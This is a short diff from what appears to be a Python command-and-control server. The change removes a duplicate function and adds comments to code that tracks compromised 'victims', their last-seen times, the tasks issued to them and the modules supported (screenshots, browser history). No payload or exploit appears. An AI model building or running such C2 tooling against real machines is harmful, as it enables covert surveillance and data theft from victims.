@@ -81,14 +81,6 @@ def get_victim_status(lastseen):
 	else:
 		print("Victim alive. Seen "+str(time.total_seconds())+" secs ago.")
 
-def display_victim_info(victim):
-	for key in victim.keys():
-		if key != '_id':
-			print(key + ' ---> '+ str(victim[key]))
-
-	get_victim_status(victim['lastseen'])
-
-	return victim
 
 ## Gets the various info of the victim. Trigerred by the info command.
 def get_victim_info(myclient,victim_id):
@@ -100,6 +92,7 @@ def get_victim_info(myclient,victim_id):
 	else:
 		return False
 
+## Displays info like id, lastseen, OS etc..
 def show_victim_info(victim):
 	for key in victim.keys():
 		if key != '_id':
@@ -116,6 +109,7 @@ def victim_present(myclient,victim_id):
 			return True
 	return False
 
+## Checks if the command issued is supported or not by the victim
 def is_command_supported(myclient,victim_id,cmd):
 	modules = {'Windows' : ['screenshot','browser_history'], 'Linux': ['screenshot']}
 	victim = get_victim_info(myclient,victim_id)
@@ -128,6 +122,7 @@ def is_command_supported(myclient,victim_id,cmd):
 
 	return False
 
+## Show the supported modules
 def show_supported_modules(myclient,victim_id):
 	modules = {'Windows' : ['screenshot','browser_history'], 'Linux': ['screenshot']}
 	victim = get_victim_info(myclient,victim_id)
@@ -136,6 +131,8 @@ def show_supported_modules(myclient,victim_id):
 		print(modules[platform])
 	else:
 		print("Something is wrong, Victim not found.")
+
+## Displays info about task issued to a victim
 def show_task_info(myclient,victim_id):
 	mydb = myclient["pythonc2"]
 	cmds = mydb["commands"]
@@ -143,6 +140,8 @@ def show_task_info(myclient,victim_id):
 
 	for cmd in x:
 		print(cmd)
+
+## Shows victim help menu
 def display_victim_help_menu():
 	commands = {'info':'Shows current victim information.' , 'modules': 'Shows modules executable on current victim.', 'tasks':'Show the task issued to the current victim and if there is output','back': 'Go back to main menu.'}
 
